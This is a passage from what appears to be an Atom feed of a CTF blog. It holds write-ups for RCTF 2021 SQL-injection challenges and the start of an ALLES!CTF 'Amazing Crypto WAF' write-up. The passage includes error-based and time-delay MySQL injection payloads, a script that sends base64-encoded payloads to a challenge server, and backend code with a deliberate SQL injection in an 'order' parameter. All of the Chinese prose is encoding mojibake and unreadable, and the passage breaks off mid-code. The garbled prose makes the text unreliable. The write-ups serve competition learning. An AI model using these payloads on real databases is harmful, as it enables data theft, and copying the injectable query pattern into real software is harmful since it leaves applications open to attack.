title="èµ›åäº¤æµ"></a>èµ›åäº¤æµ</h2><p>ä¸Nu1Lçš„@wupcoå¸ˆå‚…äº¤æµäº†ä¸€ä¸‹ï¼Œä»–è¯´prepareä¼˜å…ˆå¤„ç†updatexmlæ˜¯è€é—®é¢˜äº†ï¼Œä¹‹å‰è§è¿‡orzâ€¦ ä»–ç”¨çš„æ˜¯repeatå‡½æ•°æ¥å»¶è¿Ÿï¼Œä¸è¿‡å¥½åƒæ•ˆæœæ²¡æœ‰hexå¥½ï¼Œä»–è·‘äº†å¥½å‡ æ¬¡çš„æ ·å­ï¼Œæ—¶é—´éƒ½æ˜¯ç²¾ç¡®åˆ°æ¯«ç§’çº§åˆ«çš„ã€‚</p><p>ä¸å‡ºé¢˜äººä¹Ÿäº¤æµäº†ä¸€ä¸‹ï¼Œå‡ºé¢˜çš„æƒ³æ³•æ˜¯å¯¹æŠ—mysqlçš„ä¼˜åŒ–ï¼Œmysql ä¼šæå‰è®¡ç®—ä¸€äº›è¡¨è¾¾å¼ä¹‹ç±»çš„èƒ½é€ æˆå»¶è¿Ÿã€‚æˆ‘åœ¨æ¯”èµ›ä¸­ç”¨çš„æ˜¯mysql client çš„prepareï¼Œæ²¡æƒ³åˆ°è¿™è·Ÿpdoçš„prepareè¿˜æœ‰äº›ä¸åŒã€‚åœ¨å‘½ä»¤è¡Œé‡Œupdatexml prepareå¯ä»¥é€ æˆå»¶æ—¶ï¼Œä½†æ˜¯åœ¨pdoå´ä¸å¯ä»¥ï¼š</p><p><img src="/2021/09/13/2021-RCTF/image-20210913145939837.png" alt="image-20210913145939837"></p><p>æˆ‘åœ¨prepareå‰ï¼Œprepareå’Œexecuteä¸­é—´ä»¥åŠexecuteåéƒ½è¾“å‡ºäº†ä¸€ä¸‹æ—¶é—´ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯åœ¨executeçš„æ—¶å€™æ‰å»¶æ—¶ã€‚æ‰€ä»¥è¿™ä¸¤ä¸ªprepareè¿˜æ˜¯æœ‰äº›ä¸åŒçš„ã€‚</p><p>é™¤äº†updatexmlä»¥å¤–ï¼Œå‡ºé¢˜äººè¿˜æä¾›äº†ä¸€ç§æ–¹å¼ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(</span><br><span class="line">SELECT</span><br><span class="line">    1</span><br><span class="line">FROM</span><br><span class="line">    JSON_TABLE (</span><br><span class="line">        CONCAT (&#39;[&#39;, REPEAT(&#39;1,&#39;, IF(0,1,9999999)), &#39;1]&#39;), &#39;$[*]&#39;</span><br><span class="line">        COLUMNS ( </span><br><span class="line">            NESTED PATH &#39;$&#39; COLUMNS (r INT PATH &#39;$&#39;)</span><br><span class="line">        )</span><br><span class="line">    )</span><br><span class="line">AS t</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p><img src="/2021/09/13/2021-RCTF/image-20210913150358000.png" alt="image-20210913150358000"></p><p>åˆ©ç”¨ json_table å‡­ç©ºæä¸€ä¸ªè¡¨ã€‚</p><p>ä½†æ˜¯åŸºäº json_table å’Œ updatexml éƒ½æ— æ³•æ³¨æ•°æ®ï¼Œä¹Ÿå¯ä»¥è¯´æ˜¯æ— æ³•æ‰§è¡Œ  <code>from table_name</code>ï¼Œä¸€æ—¦å‡ºç°è¿™ä¸ªé€»è¾‘å°±æ²¡æœ‰æ—¶é—´å·®äº†ï¼Œè¿™ä¸prepareçš„å¤„ç†æœ‰å…³ç³»ï¼ˆç°åœ¨åšæ³¨å…¥é¢˜éƒ½éœ€è¦çœ‹mysqlæºç äº†ä¹ˆorzï¼‰ã€‚</p><p>å¦å¤–ä¸€ä¸ªæœ‰è¶£çš„ç‚¹æ˜¯ï¼Œåšé¢˜çš„æ—¶å€™å› ä¸ºæprepareï¼Œæ‰€ä»¥å°±å»ç¿»prepareçš„æ–‡æ¡£ï¼Œå‘ç°äº†è¿™ä¸ªï¼š</p><p><img src="/2021/09/13/2021-RCTF/image-20210913150934739.png" alt="image-20210913150934739"></p><p>8.0.22ç‰ˆæœ¬åprepareåœ¨ç¡®å®šå‚æ•°ç±»å‹è¿™å—æœ‰äº›ä¿®æ”¹ã€‚æ¯”èµ›çš„æ—¶å€™é¢˜ç›®æè¿°é‡Œå†™æ˜äº†mysqlç‰ˆæœ¬æ˜¯8.0.21ï¼Œå½“æ—¶å°±æ„Ÿè§‰è¿™å—ä¼šä¸ä¼šå°±æ˜¯è€ƒç‚¹ï¼Œä½†æ˜¯è”ç³»ä¸ä¸Šã€‚èµ›åè·Ÿå‡ºé¢˜äººäº¤æµï¼Œprepareé‡Œç”¨ updatexml å¯ä»¥é€ æˆå»¶è¿Ÿè§¦å‘çš„åœ°æ–¹å°±æ˜¯ç¡®å®šç±»å‹è¿™é‡Œï¼ˆå‡ºé¢˜äººæ‰’æºç çš„å›¾ï¼‰ï¼š</p><p><img src="/2021/09/13/2021-RCTF/image-20210913152431186.png" alt="image-20210913152431186"></p><p>å…¶ä¸­<code>if (args[1]-&gt;const_item()</code>å°±æ˜¯é™åˆ¶äº†ä¸ç”¨è®¿é—®å…¶ä»–è¡¨ã€‚</p><p>æˆ‘å¯äº†ä¸€ä¸ª8.0.22çš„dockeræµ‹è¯•ï¼Œå‘ç°å¸¸å­—ç¬¦ä¸²è¿˜å¯ä»¥å»¶æ—¶ï¼Œä½†æ˜¯user()è¿™ç§å°±ä¸è¡Œäº†ï¼š</p><p><img src="/2021/09/13/2021-RCTF/image-20210913152822945.png" alt="image-20210913152822945"></p><p>mysql8.0.22åå°±ç»™ä¿®äº†ã€‚</p><h2 id="ns-shaft-sql"><a href="#ns-shaft-sql" class="headerlink" title="ns_shaft_sql"></a>ns_shaft_sql</h2><p>é¢˜ç›®å¤§è‡´æ„æ€æ˜¯æœ‰46å…³ï¼Œæ¯ä¸€å…³ä¼ å…¥ä¸€å¥sqlï¼Œè¦è®©mysqlæŠ¥é”™ï¼Œå¹¶ä¸”æŠ¥é”™ä¿¡æ¯å«æœ‰ç‰¹å®šå­—ç¬¦ä¸²ï¼ˆéœ€è¦ç”¨selectæŸ¥è¯¢ï¼‰ã€‚æ¯è¿‡ä¸€å…³ï¼Œä¼šæŠŠä½ è¿™å…³çš„sqlè¯­å¥é‡Œç”¨åˆ°çš„æ‰€æœ‰å‡½æ•°æå–å‡ºæ¥ï¼Œå†å»ä¸€ä¸ªåä¸º$mysql_functionçš„æ•°ç»„é‡ŒæŸ¥æ‰¾ï¼Œå¦‚æœå­˜åœ¨å°±åŠ å…¥åˆ°é»‘åå•ï¼Œä½ ä¸‹ä¸€å…³å°±ä¸èƒ½ç”¨è¿™ä¸ªå‡½æ•°äº†ã€‚æœ‰ä¸ªä¾‹å¤–ï¼Œunhexå’Œconcatä¸¤ä¸ªå‡½æ•°å¯ä»¥éšä¾¿ä½¿ç”¨ï¼Œç›¸å½“äºåœ¨ç™½åå•é‡Œã€‚</p><p>ç»è¿‡æµ‹è¯•å¸¸è§çš„æŠ¥é”™æ³¨å…¥å‡½æ•°ï¼Œåƒ updatexmlï¼Œextractvalueéƒ½åœ¨è¿™ä¸ªåˆ—è¡¨é‡Œï¼ŒçŒœæµ‹è¿™åº”è¯¥æ˜¯ä¸ªmysqlæ‰€æœ‰å‡½æ•°çš„åˆ—è¡¨ï¼Ÿä¸ºäº†æå‡ºè¿™ä¸ªåˆ—è¡¨ï¼Œæˆ‘æŠŠmysqlæ–‡æ¡£ä¸Šçš„functionåˆ—è¡¨æ‹–äº†ä¸‹æ¥ï¼Œç„¶åå†™äº†ä¸ªè„šæœ¬å»æµ‹è¯•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>(<span class="params">function</span>):</span></span><br><span class="line">    s = requests.session()</span><br><span class="line">    content = s.get(<span class="string">&quot;http://124.71.132.232:23334/&quot;</span>).content</span><br><span class="line">    index = content.find(<span class="string">&#x27;key is &#x27;</span>) + <span class="built_in">len</span>(<span class="string">&#x27;key is &#x27;</span>)</span><br><span class="line">    key = content[index:index + <span class="number">8</span>]</span><br><span class="line"></span><br><span class="line">    sql = <span class="string">&quot;select &#x27;%s&#x27;,updatexml(1,concat(0x7e,(select v from s where k=&#x27;%s&#x27;),0x7e),1)&quot;</span> % (function, key)</span><br><span class="line">    resp = s.get(<span class="string">&quot;http://124.71.132.232:23334/&quot;</span>, params=&#123;<span class="string">&#x27;sql&#x27;</span>: b64encode(sql)&#125;).content</span><br><span class="line">    resp = resp[resp.find(<span class="string">&#x27;floor 2&#x27;</span>):]</span><br><span class="line">    index = resp.find(<span class="string">&quot;Disabled Functions: &quot;</span>) + <span class="built_in">len</span>(<span class="string">&quot;Disabled Functions: &quot;</span>)</span><br><span class="line">    resp = resp[index:]</span><br><span class="line">    resp = resp[:resp.find(<span class="string">&quot;\n&quot;</span>)].strip()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> resp.startswith(<span class="string">&#x27;updatexml&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span> = <span class="string">&#x27;&#x27;&#x27;ABS()</span></span><br><span class="line"><span class="string">ACOS()</span></span><br><span class="line"><span class="string">ADDDATE()</span></span><br><span class="line"><span class="string">ADDTIME()</span></span><br><span class="line"><span class="string">AES_DECRYPT()</span></span><br><span class="line"><span class="string">AES_ENCRYPT()</span></span><br><span class="line"><span class="string">AND</span></span><br><span class="line"><span class="string">ANY_VALUE()</span></span><br><span class="line"><span class="string">...&#x27;&#x27;&#x27;</span>.split(<span class="string">&quot;\n&quot;</span>) <span class="comment"># æ­¤å¤„çœç•¥ï¼Œå°±æ˜¯mysqlæ–‡æ¡£ä¸Šçš„functionåˆ—è¡¨</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> function <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">    <span class="keyword">if</span> test(function):</span><br><span class="line">        <span class="built_in">print</span> function</span><br></pre></td></tr></table></figure><p>å‘ç°å¾ˆå¤šéƒ½åœ¨åˆ—è¡¨é‡Œï¼Œæ‰€ä»¥æŠŠæ²¡åœ¨åˆ—è¡¨é‡Œçš„å‡½æ•°æ‰“å‡ºæ¥ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">AND</span><br><span class="line">BETWEEN</span><br><span class="line">AND</span><br><span class="line">BINARY</span><br><span class="line">CASE</span><br><span class="line">CONCAT</span><br><span class="line">DIV</span><br><span class="line">IS</span><br><span class="line">LAST_DAY</span><br><span class="line">LIKE</span><br><span class="line">LOCALTIMESTAMP</span><br><span class="line">LOCALTIMESTAMP</span><br><span class="line">MATCH</span><br><span class="line">MEMBER</span><br><span class="line">NOT</span><br><span class="line">OR</span><br><span class="line">REGEXP</span><br><span class="line">RLIKE</span><br><span class="line">SHA</span><br><span class="line">SOUNDS LIKE</span><br><span class="line">ST_AsWKB</span><br><span class="line">ST_AsWKT</span><br><span class="line">ST_GeometryCollectionFromText</span><br><span class="line">ST_GeomCollFromTxt()</span><br><span class="line">ST_GeometryCollectionFromWKB()</span><br><span class="line">ST_GeometryFromText()</span><br><span class="line">ST_GeometryFromWKB()</span><br><span class="line">ST_LineStringFromText()</span><br><span class="line">ST_LineStringFromWKB()</span><br><span class="line">ST_FromText()</span><br><span class="line">ST_MultiLineStringFromWKB()</span><br><span class="line">ST_MultiPointFromText()</span><br><span class="line">ST_MultiPointFromWKB()</span><br><span class="line">ST_MultiPolygonFromText()</span><br><span class="line">ST_MultiPolygonFromWKB()</span><br><span class="line">ST_NumInteriorRings()</span><br><span class="line">ST_PolygonFromText()</span><br><span class="line">ST_PolygonFromWKB()</span><br><span class="line">UNHEX()</span><br><span class="line">UPPER()</span><br><span class="line">USER()</span><br><span class="line">UTC_DATE()</span><br><span class="line">UTC_TIME()</span><br><span class="line">UTC_TIMESTAMP()</span><br><span class="line">UUID()</span><br><span class="line">UUID_SHORT()</span><br><span class="line">UUID_TO_BIN()</span><br><span class="line">VALIDATE_PASSWORD_STRENGTH()</span><br><span class="line">VALUES()</span><br><span class="line">VAR_POP()</span><br><span class="line">VAR_SAMP()</span><br><span class="line">VARIANCE()</span><br><span class="line">VERSION()</span><br><span class="line">WAIT_FOR_EXECUTED_GTID_SET()</span><br><span class="line">WAIT_UNTIL_SQL_THREAD_AFTER_GTIDS()</span><br><span class="line">WEEK()</span><br><span class="line">WEEKDAY()</span><br><span class="line">WEEKOFYEAR()</span><br><span class="line">WEIGHT_STRING()</span><br><span class="line">XOR</span><br><span class="line">YEAR()</span><br><span class="line">YEARWEEK()</span><br></pre></td></tr></table></figure><p>è¿™äº›éƒ½æ˜¯éšæ„ä½¿ç”¨æ²¡æœ‰æ¬¡æ•°é™åˆ¶çš„ï¼Œå‘ç°äº†ä¸€äº›STå¼€å¤´çš„æ²¡è¢«banï¼Œå°è¯•äº†å‡ ä¸‹ä¸è¡Œã€‚èµ›åé—®0opså¸ˆå‚…çš„åšæ³•ï¼Œå°±æ˜¯åˆ©ç”¨<code>ST_LineStringFromText</code>è¿™ä¸ªå‡½æ•°ï¼Œæˆ‘çš„å§¿åŠ¿ä¸å¯¹â€¦</p><p><img src="/2021/09/13/2021-RCTF/image-20210913155818724.png" alt="image-20210913155818724"><br>åªæœ‰ä¼ å…¥ä¸€äº›ç‰¹å®šå‚æ•°æ‰èƒ½è§¦å‘ã€‚</p><p>Nu1Lçš„wupcoå¸ˆå‚…ç”¨çš„æ˜¯è¿™ä¸ªexpï¼š<code>set @@sql_mode:=(select concat(0x22,v) from s where k=&#39;xxx&#39;);</code>ï¼Œå¾ˆå·§å¦™ã€‚</p><p>ä¸å‡ºé¢˜äººäº¤æµï¼Œå‡ºé¢˜äººè¡¨ç¤ºé¢„æœŸå°±æ˜¯ç”¨46ç§ä¸åŒçš„æ–¹å¼æ¥æŠ¥é”™ï¼Œè¿™ä¸¤ä¸ªè§£æ³•éƒ½å±äºéé¢„æœŸã€‚é‚£ä¸ªmysql function list åŸæ„æ˜¯æ‰€æœ‰çš„mysqlå‡½æ•°ï¼Œä½†æ˜¯ä¸å…¨å¯¼è‡´äº† 0ops å¸ˆå‚…çš„éé¢„æœŸã€‚</p><p>é¢„æœŸè§£æ˜¯çœ‹mysqlæºç ï¼Œç†è§£æŠ¥é”™åŸå› ï¼Œåå‘å®šä½æ‰¹é‡æ‰¾ã€‚ç¼–è¯‘ä¸€ä¸ªdebugç‰ˆæœ¬çš„mysqlï¼Œç„¶åç”¨vscode +gdbåŠ¨æ€è°ƒè¯•â€¦ å…·ä½“çœ‹å®˜æ–¹wpå§ã€‚</p><p>å…¶ä»–é¢˜ç›®æœ‰æ—¶é—´å†å¤ç°å§â€¦ verysafeå¬è¯´ç±»ä¼¼2020å·…å³°æå®¢åˆèµ›ä¸€é“é¢˜ï¼Œåˆ©ç”¨pearcmd.phpï¼Œå†ç»“åˆ caddy ä¸€ä¸ªç›®å½•ç©¿è¶Šã€‚</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;è¿™å‘¨æœ«æœ¬æ¥æœ‰æŠ¥å‘Šddlï¼Œè¯´å¥½çš„ä¸æ‰“ï¼Œç»“æœè¿˜æ˜¯å¿ä¸ä½å»çœ‹äº†é¢˜ï¼ˆROISçš„Webæ¯å¹´è¯„ä»·éƒ½ä¸é”™ï¼‰â€¦ æ‰“äº†ä¸¤å¤©ï¼Œæ—¶é—´å¤§éƒ¨åˆ†æµªè´¹åœ¨äº†ä¸¤ä¸ªsqlé¢˜ç›®ä¸Šã€‚é˜Ÿé‡Œä¹Ÿæ²¡å•¥äººæ‰“ï¼Œä¸€å…±æ‰“æ¯”èµ›çš„å°±å››ä¸ªäººã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://igml.top/categories/CTF/"/>
    
    <category term="Web" scheme="https://igml.top/categories/CTF/Web/"/>
    
    <category term="wp" scheme="https://igml.top/categories/CTF/Web/wp/"/>
    
    
    <category term="CTF" scheme="https://igml.top/tags/CTF/"/>
    
    <category term="Web" scheme="https://igml.top/tags/Web/"/>
    
    <category term="wp" scheme="https://igml.top/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>2021 ALLES!CTF Amazing Crypto WAF</title>
    <link href="https://igml.top/2021/09/05/2021-ALLESCTF/"/>
    <id>https://igml.top/2021/09/05/2021-ALLESCTF/</id>
    <published>2021-09-05T05:04:43.000Z</published>
    <updated>2021-09-05T05:51:52.588Z</updated>
    
    <content type="html"><![CDATA[<p>è¿™å‘¨æœ«æœ¬æ¥åœ¨èµ¶æŠ¥å‘Šddlï¼Œå†™æŠ¥å‘Šå†™ç´¯äº†å‡†å¤‡å»çœ‹çœ‹é¢˜ä¼‘æ¯ä¸€ä¸‹ï¼Œæ²¡æƒ³åˆ°ä¸€é“é¢˜çœ‹äº†å…­ä¸ƒä¸ªå°æ—¶å¡ä½ï¼Œæµªè´¹äº†å¾ˆå¤šæ—¶é—´.. è®°å½•ä¸‹è¿™é“é¢˜ã€‚</p><a id="more"></a><h2 id="Amazing-Crypto-WAF"><a href="#Amazing-Crypto-WAF" class="headerlink" title="Amazing Crypto WAF"></a>Amazing Crypto WAF</h2><h3 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>ç»™äº†dockerï¼Œæµè§ˆä¸€éï¼Œä¸¤ä¸ªcontainerï¼Œå¼€æ”¾æœåŠ¡çš„containeræ˜¯ä¸ªä»£ç†ï¼Œè½¬å‘è¯·æ±‚åˆ°å†…éƒ¨containerã€‚proxyä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(&#x27;/&lt;path:path&gt;&#x27;, methods=[&#x27;POST&#x27;, &#x27;GET&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proxy</span>(<span class="params">path</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Web Application Firewall</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        waf_param(request.args)</span><br><span class="line">        waf_param(request.form)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># contact backend server</span></span><br><span class="line">    proxy_request = <span class="literal">None</span></span><br><span class="line">    query = request.query_string.decode()</span><br><span class="line">    headers = &#123;<span class="string">&#x27;Cookie&#x27;</span>: request.headers.get(<span class="string">&#x27;Cookie&#x27;</span>, <span class="literal">None</span>) &#125;</span><br><span class="line">    <span class="keyword">if</span> request.method==<span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        proxy_request = requests.get(<span class="string">f&#x27;<span class="subst">&#123;BACKEND_URL&#125;</span><span class="subst">&#123;path&#125;</span>?<span class="subst">&#123;query&#125;</span>&#x27;</span>,</span><br><span class="line">                            headers=headers,</span><br><span class="line">                            allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">elif</span> request.method==<span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        headers[<span class="string">&#x27;Content-type&#x27;</span>] = request.content_type</span><br><span class="line">        proxy_request = requests.post(<span class="string">f&#x27;<span class="subst">&#123;BACKEND_URL&#125;</span><span class="subst">&#123;path&#125;</span>?<span class="subst">&#123;query&#125;</span>&#x27;</span>, </span><br><span class="line">                            data=encrypt_params(request.form),</span><br><span class="line">                            headers=headers,</span><br><span class="line">                            allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> proxy_request:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    response_data = decrypt_data(proxy_request.content)</span><br><span class="line">    injected_data = inject_ad(response_data)</span><br><span class="line">    resp = make_response(injected_data)</span><br><span class="line">    resp.status = proxy_request.status_code</span><br><span class="line">    <span class="keyword">if</span> proxy_request.headers.get(<span class="string">&#x27;Location&#x27;</span>, <span class="literal">None</span>):</span><br><span class="line">        resp.headers[<span class="string">&#x27;Location&#x27;</span>] = proxy_request.headers.get(<span class="string">&#x27;Location&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> proxy_request.headers.get(<span class="string">&#x27;Set-Cookie&#x27;</span>, <span class="literal">None</span>):</span><br><span class="line">        resp.headers[<span class="string">&#x27;Set-Cookie&#x27;</span>] = proxy_request.headers.get(<span class="string">&#x27;Set-Cookie&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> proxy_request.headers.get(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="literal">None</span>):</span><br><span class="line">        resp.content_type = proxy_request.headers.get(<span class="string">&#x27;Content-Type&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> resp</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸ªwafï¼Œè¿‡æ»¤æ‰€æœ‰çš„getå‚æ•°å’Œpostå‚æ•°ï¼Œwaf æ˜¯è¿™æ ·çš„ï¼š</p><p><img src="/2021/09/05/2021-ALLESCTF/image-20210905131132515.png" alt="image-20210905131132515"></p><p>è¿™ä¸ªä»£ç†è¿˜æœ‰ä¸€ä¸ªåŠ å¯†åŠŸèƒ½ï¼Œä¼šæŠŠpostçš„éƒ¨åˆ†å‚æ•°å€¼åœ¨è¯·æ±‚å‰ä½¿ç”¨AESåŠ å¯†ï¼š</p><p><img src="/2021/09/05/2021-ALLESCTF/image-20210905131332584.png" alt="image-20210905131332584"></p><p>å¯ä»¥çœ‹åˆ°ä¸€äº›å‚æ•°æ˜¯ä¸åŠ å¯†ã€‚åŠ å¯†ç»“æœæ˜¯<code>ENCRYPT:xxx</code>æ ¼å¼ï¼Œåœ¨å¾—åˆ°å†…å±‚containerçš„å“åº”åï¼Œè¿™ä¸ªä»£ç†ä¼šæ­£åˆ™åŒ¹é…<code>ENCRYPT:xxx</code>æ ¼å¼çš„æ•°æ®ï¼Œè¿›è¡Œè§£å¯†æ›¿æ¢å¯†æ–‡å†è¿”å›ç»™æˆ‘ä»¬ã€‚</p><p>è€Œå†…å±‚containerï¼Œsqlite æ•°æ®åº“ï¼Œæœ‰ç™»é™†/æ³¨å†Œã€å¢åˆ notesã€æŸ¥çœ‹notesåŠŸèƒ½ï¼Œå…·ä½“ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(&#x27;/notes&#x27;)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">notes</span>():</span></span><br><span class="line">    order = request.args.get(<span class="string">&#x27;order&#x27;</span>, <span class="string">&#x27;desc&#x27;</span>)</span><br><span class="line">    notes = query_db(<span class="string">f&#x27;select * from notes where user = ? order by timestamp <span class="subst">&#123;order&#125;</span>&#x27;</span>, [g.user[<span class="string">&#x27;uuid&#x27;</span>]])</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;notes.html&#x27;</span>, user=g.user, notes=notes)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/delete_note&#x27;, methods=[&#x27;POST&#x27;])</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_note</span>():</span></span><br><span class="line">    user = g.user[<span class="string">&#x27;uuid&#x27;</span>]</span><br><span class="line">    note_uuid = request.form[<span class="string">&#x27;uuid&#x27;</span>]</span><br><span class="line">    commit_db(<span class="string">&#x27;delete from notes where uuid = ? and user = ?&#x27;</span>, [note_uuid, user])</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">f&#x27;/notes?deleted=<span class="subst">&#123;note_uuid&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/add_note&#x27;, methods=[&#x27;POST&#x27;])</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_note</span>():</span></span><br><span class="line">    new_note_uuid = uuid.uuid4().<span class="built_in">hex</span></span><br><span class="line">    user = g.user[<span class="string">&#x27;uuid&#x27;</span>]</span><br><span class="line">    title = request.form[<span class="string">&#x27;title&#x27;</span>]</span><br><span class="line">    body = request.form[<span class="string">&#x27;body&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    commit_db(<span class="string">&#x27;insert into notes (uuid, user, title, body) values (?, ?, ?, ?)&#x27;</span>, </span><br><span class="line">        [new_note_uuid, user, title, body])</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&#x27;/notes&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span 